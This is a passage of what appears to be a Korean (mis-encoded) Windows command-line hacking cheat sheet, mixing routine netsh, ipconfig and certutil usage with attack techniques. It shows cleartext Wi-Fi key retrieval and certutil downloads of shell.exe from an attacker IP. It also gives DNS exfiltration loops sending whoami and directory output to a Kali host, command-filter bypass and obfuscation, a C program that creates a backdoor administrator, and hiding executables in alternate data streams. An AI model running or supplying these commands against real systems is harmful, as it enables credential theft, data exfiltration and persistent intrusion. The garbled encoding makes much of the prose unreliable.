ì‚¬ìš© ê°€ëŠ¥í•œ ì™€ì´íŒŒì´ ë„¤íŠ¸ì›Œí¬ ëª©ë¡ì„ ë³´ë ¤ë©´ ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•˜ì‹­ì‹œì˜¤:

```bash
netsh wlan show networks
```

**Connect to a Wifi Network**

**ì™€ì´íŒŒì´ ë„¤íŠ¸ì›Œí¬ì— ì—°ê²°í•˜ê¸°**

To connect to a wifi network, use the following command:

ì™€ì´íŒŒì´ ë„¤íŠ¸ì›Œí¬ì— ì—°ê²°í•˜ë ¤ë©´ ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•˜ì‹­ì‹œì˜¤:

```bash
netsh wlan connect name="WifiNetworkName"
```

Replace `WifiNetworkName` with the name of the wifi network you want to connect to.

`WifiNetworkName`ì„ ì—°ê²°í•˜ë ¤ëŠ” ì™€ì´íŒŒì´ ë„¤íŠ¸ì›Œí¬ì˜ ì´ë¦„ìœ¼ë¡œ ëŒ€ì²´í•˜ì‹­ì‹œì˜¤.

**Disconnect from a Wifi Network**

**ì™€ì´íŒŒì´ ë„¤íŠ¸ì›Œí¬ì—ì„œ ì—°ê²° í•´ì œí•˜ê¸°**

To disconnect from a wifi network, use the following command:

ì™€ì´íŒŒì´ ë„¤íŠ¸ì›Œí¬ì—ì„œ ì—°ê²°ì„ í•´ì œí•˜ë ¤ë©´ ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•˜ì‹­ì‹œì˜¤:

```bash
netsh wlan disconnect
```

**View Saved Wifi Profiles**

**ì €ì¥ëœ ì™€ì´íŒŒì´ í”„ë¡œí•„ ë³´ê¸°**

To view the list of saved wifi profiles, use the following command:

ì €ì¥ëœ ì™€ì´íŒŒì´ í”„ë¡œí•„ ëª©ë¡ì„ ë³´ë ¤ë©´ ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•˜ì‹­ì‹œì˜¤:

```bash
netsh wlan show profiles
```

**Delete a Saved Wifi Profile**

**ì €ì¥ëœ ì™€ì´íŒŒì´ í”„ë¡œí•„ ì‚­ì œí•˜ê¸°**

To delete a saved wifi profile, use the following command:

ì €ì¥ëœ ì™€ì´íŒŒì´ í”„ë¡œí•„ì„ ì‚­ì œí•˜ë ¤ë©´ ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•˜ì‹­ì‹œì˜¤:

```bash
netsh wlan delete profile name="WifiProfileName"
```

Replace `WifiProfileName` with the name of the wifi profile you want to delete.

`WifiProfileName`ì„ ì‚­ì œí•˜ë ¤ëŠ” ì™€ì´íŒŒì´ í”„ë¡œí•„ì˜ ì´ë¦„ìœ¼ë¡œ ëŒ€ì²´í•˜ì‹­ì‹œì˜¤.

```bash
netsh wlan show profile #AP SSID
netsh wlan show profile <SSID> key=clear #Get Cleartext Pass
```

#### SNMP

SNMP(Simple Network Management Protocol)ì€ ë„¤íŠ¸ì›Œí¬ ì¥ì¹˜ ë° ì„œë²„ì—ì„œ ì •ë³´ë¥¼ ìˆ˜ì§‘í•˜ê³  ê´€ë¦¬í•˜ê¸° ìœ„í•´ ì‚¬ìš©ë˜ëŠ” í”„ë¡œí† ì½œì…ë‹ˆë‹¤. SNMPëŠ” ì£¼ë¡œ ì‹œìŠ¤í…œ ë° ë„¤íŠ¸ì›Œí¬ ëª¨ë‹ˆí„°ë§ì— ì‚¬ìš©ë˜ë©°, ì¥ì¹˜ì˜ ìƒíƒœ, ì„±ëŠ¥ ë° ê¸°íƒ€ ê´€ë ¨ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

SNMPëŠ” ì—ì´ì „íŠ¸ì™€ ê´€ë¦¬ì ê°„ì˜ í†µì‹ ì„ ìœ„í•´ ì‚¬ìš©ë©ë‹ˆë‹¤. ì—ì´ì „íŠ¸ëŠ” ëª¨ë‹ˆí„°ë§í•  ì¥ì¹˜ì— ì„¤ì¹˜ë˜ì–´ ë°ì´í„°ë¥¼ ìˆ˜ì§‘í•˜ê³ , ê´€ë¦¬ìëŠ” ì´ëŸ¬í•œ ë°ì´í„°ë¥¼ ì‚¬ìš©í•˜ì—¬ ì¥ì¹˜ì˜ ìƒíƒœë¥¼ íŒŒì•…í•˜ê³  ë¬¸ì œë¥¼ í•´ê²°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

SNMPëŠ” ì£¼ë¡œ SNMPv1, SNMPv2c ë° SNMPv3ì˜ ì„¸ ê°€ì§€ ë²„ì „ìœ¼ë¡œ ì‚¬ìš©ë©ë‹ˆë‹¤. ê° ë²„ì „ì€ ë³´ì•ˆ ë° ì¸ì¦ ê¸°ëŠ¥ì˜ ì°¨ì´ê°€ ìˆìœ¼ë©°, SNMPv3ì€ ê°€ì¥ ì•ˆì „í•œ ë²„ì „ìœ¼ë¡œ ì•”í˜¸í™” ë° ì¸ì¦ì„ ì§€ì›í•©ë‹ˆë‹¤.

SNMPëŠ” ì¼ë°˜ì ìœ¼ë¡œ ì‹œìŠ¤í…œ ë° ë„¤íŠ¸ì›Œí¬ ê´€ë¦¬ìì—ê²Œ ìœ ìš©í•œ ì •ë³´ë¥¼ ì œê³µí•˜ëŠ” ë„êµ¬ë¡œ ì‚¬ìš©ë©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì•…ì˜ì ì¸ ëª©ì ìœ¼ë¡œ ì‚¬ìš©ë  ìˆ˜ë„ ìˆìœ¼ë¯€ë¡œ ë³´ì•ˆ ì„¤ì •ì´ ì¤‘ìš”í•©ë‹ˆë‹¤.

```
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
```

#### ë„¤íŠ¸ì›Œí¬ ì¸í„°í˜ì´ìŠ¤

**ëª©í‘œ**

* ì‹œìŠ¤í…œì˜ ë„¤íŠ¸ì›Œí¬ ì¸í„°í˜ì´ìŠ¤ ì •ë³´ë¥¼ ì–»ëŠ”ë‹¤.
* ë„¤íŠ¸ì›Œí¬ ì¸í„°í˜ì´ìŠ¤ë¥¼ ê´€ë¦¬í•œë‹¤.

**ëª…ë ¹ì–´**

* `ipconfig`: ì‹œìŠ¤í…œì˜ ë„¤íŠ¸ì›Œí¬ ì¸í„°í˜ì´ìŠ¤ ì •ë³´ë¥¼ í‘œì‹œí•œë‹¤.
* `netsh interface show interface`: ì‹œìŠ¤í…œì˜ ëª¨ë“  ë„¤íŠ¸ì›Œí¬ ì¸í„°í˜ì´ìŠ¤ë¥¼ í‘œì‹œí•œë‹¤.
* `netsh interface set interface "InterfaceName" admin=enable`: ì§€ì •ëœ ë„¤íŠ¸ì›Œí¬ ì¸í„°í˜ì´ìŠ¤ë¥¼ í™œì„±í™”í•œë‹¤.
* `netsh interface set interface "InterfaceName" admin=disable`: ì§€ì •ëœ ë„¤íŠ¸ì›Œí¬ ì¸í„°í˜ì´ìŠ¤ë¥¼ ë¹„í™œì„±í™”í•œë‹¤.

**ì˜ˆì œ**

* `ipconfig` ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•˜ì—¬ ì‹œìŠ¤í…œì˜ ë„¤íŠ¸ì›Œí¬ ì¸í„°í˜ì´ìŠ¤ ì •ë³´ë¥¼ í™•ì¸í•  ìˆ˜ ìˆë‹¤.

```plaintext
C:\> ipconfig

Windows IP Configuration

Ethernet adapter Ethernet:
   Connection-specific DNS Suffix  . : example.com
   IPv4 Address. . . . . . . . . . . : 192.168.1.100
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.1.1

Ethernet adapter Wi-Fi:
   Connection-specific DNS Suffix  . : example.com
   IPv4 Address. . . . . . . . . . . : 192.168.1.101
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.1.1
```

* `netsh interface show interface` ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•˜ì—¬ ì‹œìŠ¤í…œì˜ ëª¨ë“  ë„¤íŠ¸ì›Œí¬ ì¸í„°í˜ì´ìŠ¤ë¥¼ í™•ì¸í•  ìˆ˜ ìˆë‹¤.

```plaintext
C:\> netsh interface show interface

Admin State    State          Type             Interface Name
-------------------------------------------------------------------------
Enabled        Connected      Dedicated        Ethernet
Enabled        Connected      Dedicated        Wi-Fi
```

* `netsh interface set interface "Ethernet" admin=disable` ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•˜ì—¬ "Ethernet" ë„¤íŠ¸ì›Œí¬ ì¸í„°í˜ì´ìŠ¤ë¥¼ ë¹„í™œì„±í™”í•  ìˆ˜ ìˆë‹¤.

```plaintext
C:\> netsh interface set interface "Ethernet" admin=disable

Ok.
```

* `netsh interface set interface "Wi-Fi" admin=enable` ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•˜ì—¬ "Wi-Fi" ë„¤íŠ¸ì›Œí¬ ì¸í„°í˜ì´ìŠ¤ë¥¼ í™œì„±í™”í•  ìˆ˜ ìˆë‹¤.

```plaintext
C:\> netsh interface set interface "Wi-Fi" admin=enable

Ok.
```

```bash
ipconfig /all
```

#### ARP í…Œì´ë¸”

ARP(Address Resolution Protocol) í…Œì´ë¸”ì€ IP ì£¼ì†Œì™€ MAC ì£¼ì†Œ ê°„ì˜ ë§¤í•‘ ì •ë³´ë¥¼ ì €ì¥í•˜ëŠ” í…Œì´ë¸”ì…ë‹ˆë‹¤. ì´ í…Œì´ë¸”ì€ ë„¤íŠ¸ì›Œí¬ ì¥ì¹˜ê°€ í†µì‹ í•  ë•Œ ì‚¬ìš©ë˜ë©°, íŠ¹ì • IP ì£¼ì†Œì— ëŒ€í•œ MAC ì£¼ì†Œë¥¼ ì°¾ì„ ë•Œ ì°¸ì¡°ë©ë‹ˆë‹¤.

ARP í…Œì´ë¸”ì€ ë‹¤ìŒê³¼ ê°™ì€ ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•˜ì—¬ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```plaintext
arp -a
```

ì´ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•˜ë©´ í˜„ì¬ ì‹œìŠ¤í…œì˜ ARP í…Œì´ë¸”ì´ í‘œì‹œë©ë‹ˆë‹¤. ê° í•­ëª©ì€ IP ì£¼ì†Œ, í•´ë‹¹ IP ì£¼ì†Œì— ëŒ€í•œ MAC ì£¼ì†Œ, ìœ í˜•(ì •ì  ë˜ëŠ” ë™ì ) ë“±ì˜ ì •ë³´ë¥¼ í¬í•¨í•©ë‹ˆë‹¤.

ARP í…Œì´ë¸”ì€ ë„¤íŠ¸ì›Œí¬ ê³µê²©ì— ì‚¬ìš©ë  ìˆ˜ ìˆìœ¼ë¯€ë¡œ, ì‹œìŠ¤í…œ ë³´ì•ˆì„ ê°•í™”í•˜ê¸° ìœ„í•´ ì£¼ê¸°ì ìœ¼ë¡œ í™•ì¸í•˜ëŠ” ê²ƒì´ ì¢‹ìŠµë‹ˆë‹¤.

```bash
arp -A
```

### ë‹¤ìš´ë¡œë“œ

Bitsadmin.exe

```
bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1
```

## CertReq.exe

CertReq.exeëŠ” Windows ìš´ì˜ ì²´ì œì—ì„œ ì¸ì¦ì„œ ìš”ì²­ì„ ìƒì„±í•˜ê³  ì œì¶œí•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” ëª…ë ¹ ì¤„ ë„êµ¬ì…ë‹ˆë‹¤.

### ì‚¬ìš©ë²•

CertReq.exeëŠ” ë‹¤ìŒê³¼ ê°™ì€ êµ¬ë¬¸ì„ ì‚¬ìš©í•˜ì—¬ ì‹¤í–‰ë©ë‹ˆë‹¤:

```plaintext
CertReq [Options] [RequestFile [CertFile [CertChainFile]]]
```

* `Options`: CertReq.exeì˜ ë‹¤ì–‘í•œ ì˜µì…˜ì„ ì§€ì •í•©ë‹ˆë‹¤.
* `RequestFile`: ì¸ì¦ì„œ ìš”ì²­ì„ ì •ì˜í•˜ëŠ” ìš”ì²­ íŒŒì¼ì˜ ê²½ë¡œì…ë‹ˆë‹¤.
* `CertFile`: ì¸ì¦ì„œ íŒŒì¼ì˜ ê²½ë¡œì…ë‹ˆë‹¤. ì´ ì˜µì…˜ì„ ì‚¬ìš©í•˜ë©´ ì¸ì¦ì„œ ìš”ì²­ì— ëŒ€í•œ ì„œëª…ëœ ì¸ì¦ì„œë¥¼ ìƒì„±í•©ë‹ˆë‹¤.
* `CertChainFile`: ì¸ì¦ì„œ ì²´ì¸ íŒŒì¼ì˜ ê²½ë¡œì…ë‹ˆë‹¤. ì´ ì˜µì…˜ì„ ì‚¬ìš©í•˜ë©´ ì¸ì¦ì„œ ìš”ì²­ì— ëŒ€í•œ ì„œëª…ëœ ì¸ì¦ì„œ ì²´ì¸ì„ ìƒì„±í•©ë‹ˆë‹¤.

### ì˜ˆì œ

ë‹¤ìŒì€ CertReq.exeë¥¼ ì‚¬ìš©í•˜ì—¬ ì¸ì¦ì„œ ìš”ì²­ì„ ìƒì„±í•˜ëŠ” ì˜ˆì œì…ë‹ˆë‹¤:

```plaintext
CertReq -new -f myrequest.inf -p mypassword
```

ì´ ì˜ˆì œì—ì„œëŠ” `-new` ì˜µì…˜ì„ ì‚¬ìš©í•˜ì—¬ ìƒˆë¡œìš´ ì¸ì¦ì„œ ìš”ì²­ì„ ìƒì„±í•˜ê³ , `-f` ì˜µì…˜ì„ ì‚¬ìš©í•˜ì—¬ ìš”ì²­ì„ ì •ì˜í•˜ëŠ” INF íŒŒì¼ì¸ `myrequest.inf`ë¥¼ ì§€ì •í•©ë‹ˆë‹¤. ë˜í•œ, `-p` ì˜µì…˜ì„ ì‚¬ìš©í•˜ì—¬ ìš”ì²­ì— ëŒ€í•œ ë¹„ë°€ë²ˆí˜¸ë¥¼ `mypassword`ë¡œ ì„¤ì •í•©ë‹ˆë‹¤.

### ì°¸ê³ 

CertReq.exeëŠ” ì¸ì¦ì„œ ìš”ì²­ì„ ìƒì„±í•˜ê³  ì œì¶œí•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” ê°•ë ¥í•œ ë„êµ¬ì…ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì˜¬ë°”ë¥¸ ì˜µì…˜ê³¼ ë§¤ê°œ ë³€ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤. ìì„¸í•œ ë‚´ìš©ì€ Windows ê³µì‹ ë¬¸ì„œë¥¼ ì°¸ì¡°í•˜ì‹­ì‹œì˜¤.

```
CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt
```

## Certutil.exe

`Certutil.exe`ëŠ” Windows ìš´ì˜ ì²´ì œì—ì„œ ì¸ì¦ì„œ ìœ í‹¸ë¦¬í‹°ë¡œ ì‚¬ìš©ë˜ëŠ” ëª…ë ¹ì¤„ ë„êµ¬ì…ë‹ˆë‹¤. ì´ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ì¸ì¦ì„œì™€ ì¸ì¦ì„œ ê´€ë ¨ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ëª…ë ¹ì–´

#### 1. ì¸ì¦ì„œ ì •ë³´ ë³´ê¸°

```plaintext
certutil -dump <ì¸ì¦ì„œ íŒŒì¼ ê²½ë¡œ>
```

ì¸ì¦ì„œ íŒŒì¼ì˜ ì •ë³´ë¥¼ í‘œì‹œí•©ë‹ˆë‹¤.

#### 2. ì¸ì¦ì„œ ì„¤ì¹˜

```plaintext
certutil -addstore <ì €ì¥ì†Œ ì´ë¦„> <ì¸ì¦ì„œ íŒŒì¼ ê²½ë¡œ>
```

ì¸ì¦ì„œë¥¼ ì§€ì •ëœ ì €ì¥ì†Œì— ì„¤ì¹˜í•©ë‹ˆë‹¤.

#### 3. ì¸ì¦ì„œ ì œê±°

```plaintext
certutil -delstore <ì €ì¥ì†Œ ì´ë¦„> <ì¸ì¦ì„œ ì¼ë ¨ë²ˆí˜¸>
```

ì €ì¥ì†Œì—ì„œ íŠ¹ì • ì¸ì¦ì„œë¥¼ ì œê±°í•©ë‹ˆë‹¤.

#### 4. ì¸ì¦ì„œ ë‚´ë³´ë‚´ê¸°

```plaintext
certutil -exportPFX <ì¸ì¦ì„œ ì¼ë ¨ë²ˆí˜¸> <ë‚´ë³´ë‚¼ íŒŒì¼ ê²½ë¡œ>
```

ì¸ì¦ì„œë¥¼ PFX íŒŒì¼ë¡œ ë‚´ë³´ëƒ…ë‹ˆë‹¤.

#### 5. ì¸ì¦ì„œ ê°€ì ¸ì˜¤ê¸°

```plaintext
certutil -importPFX <ë‚´ë³´ë‚¸ íŒŒì¼ ê²½ë¡œ>
```

PFX íŒŒì¼ì—ì„œ ì¸ì¦ì„œë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### 6. ì¸ì¦ì„œ ê²€ì¦

```plaintext
certutil -verify <ì¸ì¦ì„œ íŒŒì¼ ê²½ë¡œ>
```

ì¸ì¦ì„œì˜ ìœ íš¨ì„±ì„ ê²€ì¦í•©ë‹ˆë‹¤.

#### 7. ì¸ì¦ì„œ ì—°ê²°

```plaintext
certutil -repairstore <ì €ì¥ì†Œ ì´ë¦„> <ì¸ì¦ì„œ ì¼ë ¨ë²ˆí˜¸>
```

ì €ì¥ì†Œì—ì„œ íŠ¹ì • ì¸ì¦ì„œì™€ ì—°ê²°ì„ ë³µêµ¬í•©ë‹ˆë‹¤.

#### 8. ì¸ì¦ì„œ ëª©ë¡ í‘œì‹œ

```plaintext
certutil -store <ì €ì¥ì†Œ ì´ë¦„>
```

ì§€ì •ëœ ì €ì¥ì†Œì— ìˆëŠ” ì¸ì¦ì„œ ëª©ë¡ì„ í‘œì‹œí•©ë‹ˆë‹¤.

### ì˜ˆì œ

```plaintext
certutil -dump C:\path\to\certificate.cer
```

```plaintext
certutil -addstore -enterprise -f "Root" C:\path\to\certificate.cer
```

```plaintext
certutil -delstore -enterprise "Root" 1234567890abcdef
```

```plaintext
certutil -exportPFX 1234567890abcdef C:\path\to\exported_certificate.pfx
```

```plaintext
certutil -importPFX C:\path\to\exported_certificate.pfx
```

```plaintext
certutil -verify C:\path\to\certificate.cer
```

```plaintext
certutil -repairstore -enterprise "Root" 1234567890abcdef
```

```plaintext
certutil -store -enterprise "Root"
```

ì´ ëª…ë ¹ì–´ë“¤ì€ `Certutil.exe`ë¥¼ ì‚¬ìš©í•˜ì—¬ ì¸ì¦ì„œì™€ ê´€ë ¨ëœ ì‘ì—…ì„ ìˆ˜í–‰í•˜ëŠ” ë° ë„ì›€ì´ ë©ë‹ˆë‹¤.

```
certutil.exe -urlcache -split -f "http://10.10.14.13:8000/shell.exe" s.exe
```

\*\*[https://lolbas-project.github.io](https://lolbas-project.github.io/)\*\*ì—ì„œ `Download`ì„ ê²€ìƒ‰í•˜ì—¬ ë” ë§ì€ ì •ë³´ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ê¸°íƒ€

```bash
cd #Get current dir
cd C:\path\to\dir #Change dir
dir #List current dir
dir /a:h C:\path\to\dir #List hidden files
dir /s /b #Recursive list without shit
time #Get current time
date #Get current date
shutdown /r /t 0 #Shutdown now
type <file> #Cat file

#Runas
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe" #Use saved credentials
runas /netonly /user:<DOMAIN>\<NAME> "cmd.exe" ::The password will be prompted

#Hide
attrib +h file #Set Hidden
attrib -h file #Quit Hidden

#Give full control over a file that you owns
icacls <FILE_PATH> /t /e /p <USERNAME>:F
icacls <FILE_PATH> /e /r <USERNAME> #Remove the permision

#Recursive copy to smb
xcopy /hievry C:\Users\security\.yawcam \\10.10.14.13\name\win

#exe2bat to transform exe file in bat file

#ADS
dir /r #Detect ADS
more file.txt:ads.txt #read ADS
powershell (Get-Content file.txt -Stream ads.txt)

# Get error messages from code
net helpmsg 32 #32 is the code in that case
```

#### ê¸ˆì§€ëœ ë¬¸ìì—´ ìš°íšŒ

In some cases, when trying to exploit a vulnerability or perform a command injection attack, you may encounter a situation where certain characters are blacklisted or filtered out. This can make it challenging to execute the desired command. However, there are several techniques you can use to bypass character blacklisting and successfully execute your command.

ì¼ë¶€ ì¼€ì´ìŠ¤ì—ì„œ ì·¨ì•½ì ì„ ì´ìš©í•˜ê±°ë‚˜ ëª…ë ¹ ì£¼ì… ê³µê²©ì„ ìˆ˜í–‰í•  ë•Œ, íŠ¹ì • ë¬¸ìì—´ì´ ê¸ˆì§€ë˜ê±°ë‚˜ í•„í„°ë§ë˜ì–´ ìˆëŠ” ìƒí™©ì„ ë§ˆì£¼ì¹  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” ì›í•˜ëŠ” ëª…ë ¹ì„ ì‹¤í–‰í•˜ëŠ” ë° ì–´ë ¤ì›€ì„ ì¤„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ê¸ˆì§€ëœ ë¬¸ìì—´ì„ ìš°íšŒí•˜ê³  ëª…ë ¹ì„ ì„±ê³µì ìœ¼ë¡œ ì‹¤í–‰í•˜ê¸° ìœ„í•´ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ì—¬ëŸ¬ ê¸°ìˆ ì´ ìˆìŠµë‹ˆë‹¤.

One common technique is to use alternative representations of the blacklisted characters. For example, if the character 'a' is blacklisted, you can try using its ASCII or Unicode representation instead. Similarly, you can try using different case variations or encoding schemes to bypass the blacklist.

ì¼ë°˜ì ì¸ ê¸°ìˆ  ì¤‘ í•˜ë‚˜ëŠ” ê¸ˆì§€ëœ ë¬¸ìì—´ì˜ ëŒ€ì²´ í‘œí˜„ì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ë¬¸ì 'a'ê°€ ê¸ˆì§€ë˜ì–´ ìˆë‹¤ë©´, ëŒ€ì‹  ASCII ë˜ëŠ” Unicode í‘œí˜„ì„ ì‚¬ìš©í•´ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë§ˆì°¬ê°€ì§€ë¡œ, ëŒ€ì†Œë¬¸ì ë³€í˜•ì´ë‚˜ ì¸ì½”ë”© ë°©ì‹ì„ ë‹¤ë¥´ê²Œ ì‚¬ìš©í•˜ì—¬ ê¸ˆì§€ ëª©ë¡ì„ ìš°íšŒí•´ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

Another technique is to use concatenation or string manipulation to construct the desired command using allowed characters. For example, if the character ';' is blacklisted, you can try using other characters to concatenate multiple commands or use string manipulation functions to achieve the desired result.

ë˜ ë‹¤ë¥¸ ê¸°ìˆ ì€ ì—°ê²° ë˜ëŠ” ë¬¸ìì—´ ì¡°ì‘ì„ ì‚¬ìš©í•˜ì—¬ í—ˆìš©ëœ ë¬¸ìë¥¼ ì‚¬ìš©í•˜ì—¬ ì›í•˜ëŠ” ëª…ë ¹ì„ êµ¬ì„±í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ë¬¸ì ';'ê°€ ê¸ˆì§€ë˜ì–´ ìˆë‹¤ë©´, ë‹¤ë¥¸ ë¬¸ìë¥¼ ì‚¬ìš©í•˜ì—¬ ì—¬ëŸ¬ ëª…ë ¹ì„ ì—°ê²°í•˜ê±°ë‚˜ ë¬¸ìì—´ ì¡°ì‘ í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ ì›í•˜ëŠ” ê²°ê³¼ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

It's important to note that bypassing character blacklisting may require trial and error, as different applications or systems may have different blacklisting rules. Therefore, it's crucial to thoroughly understand the blacklisting mechanism and experiment with different techniques to find the most effective approach.

ë¬¸ìì—´ ê¸ˆì§€ ìš°íšŒëŠ” ì„œë¡œ ë‹¤ë¥¸ ì‘ìš© í”„ë¡œê·¸ë¨ì´ë‚˜ ì‹œìŠ¤í…œë§ˆë‹¤ ë‹¤ë¥¸ ê¸ˆì§€ ê·œì¹™ì´ ìˆì„ ìˆ˜ ìˆìœ¼ë¯€ë¡œ ì‹œí–‰ì°©ì˜¤ê°€ í•„ìš”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ, ë¬¸ìì—´ ê¸ˆì§€ ë©”ì»¤ë‹ˆì¦˜ì„ ì™„ì „íˆ ì´í•´í•˜ê³  ë‹¤ì–‘í•œ ê¸°ìˆ ì„ ì‹¤í—˜í•˜ì—¬ ê°€ì¥ íš¨ê³¼ì ì¸ ì ‘ê·¼ ë°©ì‹ì„ ì°¾ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤.

```bash
echo %HOMEPATH:~6,-11%   #\
who^ami   #whoami
```

#### DOSfuscation

CMD ë¼ì¸ì„ ë‚œë…í™”í•˜ëŠ” ì½”ë“œë¥¼ ìƒì„±í•©ë‹ˆë‹¤.

```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
help
SET COMMAND type C:\Users\Administrator\Desktop\flag.txt
encoding
```

#### ìˆ˜ì‹  ì£¼ì†Œ ACL

ê´€ë¦¬ì ê¶Œí•œ ì—†ì´ [http://+:80/Temporary\_Listen\_Addresses/](http://+/Temporary\_Listen\_Addresses/)ì—ì„œ ìˆ˜ì‹ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```bash
netsh http show urlacl
```

#### ìˆ˜ë™ DNS ì‰˜

**ê³µê²©ì** (Kali)ëŠ” ë‹¤ìŒ ë‘ ê°€ì§€ ì˜µì…˜ ì¤‘ í•˜ë‚˜ë¥¼ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤:

```bash
sudo responder -I <iface> #Active
sudo tcpdump -i <iface> -A proto udp and dst port 53 and dst ip <KALI_IP> #Passive
```

**í”¼í•´ì**

**`for /f tokens`** ê¸°ìˆ : ì´ë¥¼ í†µí•´ ìš°ë¦¬ëŠ” ëª…ë ¹ì„ ì‹¤í–‰í•˜ê³  ê° ì¤„ì˜ ì²« X ë‹¨ì–´ë¥¼ ê°€ì ¸ì™€ DNSë¥¼ í†µí•´ ì„œë²„ë¡œ ì „ì†¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```bash
for /f %a in ('whoami') do nslookup %a <IP_kali> #Get whoami
for /f "tokens=2" %a in ('echo word1 word2') do nslookup %a <IP_kali> #Get word2
for /f "tokens=1,2,3" %a in ('dir /B C:\') do nslookup %a.%b.%c <IP_kali> #List folder
for /f "tokens=1,2,3" %a in ('dir /B "C:\Program Files (x86)"') do nslookup %a.%b.%c <IP_kali> #List that folder
for /f "tokens=1,2,3" %a in ('dir /B "C:\Progra~2"') do nslookup %a.%b.%c <IP_kali> #Same as last one
#More complex commands
for /f "tokens=1,2,3,4,5,6,7,8,9" %a in ('whoami /priv ^| findstr /i "enable"') do nslookup %a.%b.%c.%d.%e.%f.%g.%h.%i <IP_kali> #Same as last one
```

ì¶œë ¥ì„ **ë¦¬ë‹¤ì´ë ‰íŠ¸**í•˜ì—¬ ê·¸ê²ƒì„ **ì½ì„ ìˆ˜**ë„ ìˆìŠµë‹ˆë‹¤.

```
whoami /priv | finstr "Enab" > C:\Users\Public\Documents\out.txt
for /f "tokens=1,2,3,4,5,6,7,8,9" %a in ('type "C:\Users\Public\Documents\out.txt"') do nslookup %a.%b.%c.%d.%e.%f.%g.%h.%i <IP_kali>
```

### C ì½”ë“œì—ì„œ CMD í˜¸ì¶œí•˜ê¸°

To call CMD from C code, you can use the `system()` function provided by the C standard library. This function allows you to execute a command in the command prompt.

Here is an example of how to call CMD from C code:

```c
#include <stdlib.h>

int main() {
    system("cmd /c <command>");
    return 0;
}
```

In the above code, replace `<command>` with the command you want to execute in CMD. The `/c` flag is used to execute the command and then terminate CMD.

Compile and run the C code, and it will call CMD and execute the specified command.

Note: Be cautious when executing commands from C code, as it can pose security risks if not handled properly. Always validate and sanitize user input to prevent command injection vulnerabilities.

```c
#include <stdlib.h>     /* system, NULL, EXIT_FAILURE */

// When executed by Administrator this program will create a user and then add him to the administrators group
// i686-w64-mingw32-gcc addmin.c -o addmin.exe
// upx -9 addmin.exe

int main (){
int i;
i=system("net users otherAcc 0TherAcc! /add");
i=system("net localgroup administrators otherAcc /add");
return 0;
}
```

### ëŒ€ì²´ ë°ì´í„° ìŠ¤íŠ¸ë¦¼ ì¹˜íŠ¸ì‹œíŠ¸ (ADS/ëŒ€ì²´ ë°ì´í„° ìŠ¤íŠ¸ë¦¼)

**ì˜ˆì‹œëŠ”** [**https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f**](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)**ì—ì„œ ê°€ì ¸ì™”ìŠµë‹ˆë‹¤. ê·¸ê³³ì—ëŠ” ë” ë§ì€ ì˜ˆì‹œê°€ ìˆìŠµë‹ˆë‹¤!**

```bash
## Selected Examples of ADS Operations ##

### Adding Content to ADS ###
# Append executable to a log file as an ADS
type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
# Download a script directly into an ADS
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt

### Discovering ADS Content ###
# List files and their ADS
dir /R
